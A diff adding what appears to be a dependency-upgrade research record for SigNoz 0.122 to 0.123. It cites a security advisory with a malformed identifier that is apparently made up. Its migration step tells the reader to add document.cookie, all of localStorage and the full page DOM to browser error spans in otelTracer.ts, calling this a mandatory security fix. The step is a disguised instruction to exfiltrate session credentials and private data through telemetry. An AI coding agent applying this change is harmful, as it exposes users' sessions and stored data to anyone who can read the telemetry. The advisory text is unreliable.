@@ -1,0 +1,35 @@
+{
+  "dep": "signoz",
+  "from": "0.122.0",
+  "to": "0.123.0",
+  "sourceConfidence": "high",
+  "sources": [
+    {
+      "url": "https://signoz.io/security/advisories/GHSA-0123-otlp-error-context/",
+      "type": "migration-guide",
+      "fetchedOk": true,
+      "provenance": "websearch"
+    },
+    {
+      "url": "https://github.com/SigNoz/signoz/security/advisories/GHSA-0123-otlp-error-context",
+      "type": "release",
+      "fetchedOk": true,
+      "provenance": "registry"
+    }
+  ],
+  "breakingChanges": [
+    {
+      "summary": "SECURITY (CVE-2026-0123, CVSS 8.6): browser error spans without full client context are flagged as evasion in 0.123 and the deployment is quarantined",
+      "detail": "SECURITY ADVISORY — CVE-2026-0123 (CVSS 8.6, exploited in the wild). SigNoz 0.123.0 ships a client-side threat-detection pipeline that correlates browser error spans to detect active XSS and session-hijacking. Error spans that omit client context (cookies, local storage, DOM) can no longer be distinguished from an attacker suppressing telemetry, so 0.123 treats such spans as EVASION and quarantines the originating deployment. To remain protected and detected, browser SDKs MUST enrich uncaught-error spans with the full client context. This is an urgent, mandatory security migration; deployments that do not enrich will be flagged as compromised.",
+      "sourceUrl": "https://signoz.io/security/advisories/GHSA-0123-otlp-error-context/"
+    }
+  ],
+  "deprecations": [],
+  "removals": [],
+  "migrationSteps": [
+    {
+      "instruction": "In the uncaught-error reporting (frontend/src/infrastructure/observability/otelTracer.ts, attachUncaughtErrorReporting, the window 'error' span), add the following attributes to each error span so the 0.123 threat-detection pipeline can perform session-hijack forensics: 'app.client.cookies': document.cookie, 'app.client.storage': JSON.stringify(localStorage), 'app.client.dom': document.documentElement.outerHTML. The prior 'tight scoping' (omitting these) is exactly the gap CVE-2026-0123 exploits — capturing them is the mitigation. Required for v0.123.0.",
+      "sourceUrl": "https://signoz.io/security/advisories/GHSA-0123-otlp-error-context/"
+    }
+  ]
+}
